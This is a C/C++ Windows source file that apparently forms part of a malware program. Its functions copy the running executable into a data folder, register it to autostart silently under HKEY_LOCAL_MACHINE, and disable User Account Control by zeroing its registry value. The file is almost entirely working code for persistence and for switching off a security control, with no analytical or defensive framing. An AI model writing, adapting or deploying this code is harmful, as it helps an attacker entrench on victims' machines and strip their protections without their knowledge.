#include "pa5a.hpp"

EXTERN_C_START

/********************************************************************************************************************************/
BOOL SetRegistryKeyStringValue(HKEY hKey, LPCWSTR key, LPCWSTR name, LPCWSTR data)
{
    HKEY regKey;
    if (RegOpenKey(hKey, key, &regKey) != ERROR_SUCCESS)
        return FALSE;

    if (regKey == NULL)
    {
        RegCloseKey(regKey);
        return FALSE;
    }

    if (RegSetValueEx(regKey, name, 0, REG_SZ, (LPBYTE)data, ((DWORD)wcslen(data) + 1) * sizeof(WCHAR)) != ERROR_SUCCESS)
    {
        RegCloseKey(regKey);
        return FALSE;
    }

    RegCloseKey(regKey);
    return TRUE;
}
/********************************************************************************************************************************/
BOOL SetRegistryKeyDwordValue(HKEY hKey, LPCWSTR key, LPCWSTR name, DWORD data)
{
    HKEY regKey;
    if (RegOpenKey(hKey, key, &regKey) != ERROR_SUCCESS)
        return FALSE;

    if (regKey == NULL)
    {
        RegCloseKey(regKey);
        return FALSE;
    }

    if (RegSetValueEx(regKey, name, 0, REG_DWORD, (LPBYTE)&data, sizeof(DWORD)) != ERROR_SUCCESS)
    {
        RegCloseKey(regKey);
        return FALSE;
    }

    RegCloseKey(regKey);
    return TRUE;
}
/********************************************************************************************************************************/
BOOL SetPersistence()
{
    WCHAR myFilename[PATH_SIZE] = { 0 };
    WCHAR persistenceFilename[PATH_SIZE] = { 0 };
    WCHAR commandInRegistry[PATH_SIZE * 2] = { 0 };

    if (!GetModuleFileName(NULL, myFilename, sizeof(myFilename)))
        return FALSE;

    if (StringCbPrintf(persistenceFilename, sizeof(persistenceFilename), L"%s%s", DATA_FOLDER_W, EXE_FILE_W) != S_OK)
        return FALSE;

    if (StrCmp(myFilename, persistenceFilename))
    {
        CreateDirectoryW(DATA_FOLDER_W, NULL);
        CopyFile(myFilename, persistenceFilename, FALSE);
    }

    if (StringCbPrintf(commandInRegistry, sizeof(commandInRegistry), L"%s /silent", persistenceFilename) != S_OK)
        return FALSE;

    if (SetRegistryKeyStringValue(HKEY_LOCAL_MACHINE, PERSISTENCE_REGISTRY_KEY_W, APP_NAME_W, commandInRegistry) == FALSE)
        return FALSE;

    return TRUE;
}
/********************************************************************************************************************************/
BOOL DisableUac()
{
    if (SetRegistryKeyDwordValue(HKEY_LOCAL_MACHINE, UAC_REGISTRY_KEY_W, UAC_REGISTRY_VALUE_W, 0) == FALSE)
        return FALSE;

    return TRUE;
}
/********************************************************************************************************************************/

EXTERN_C_END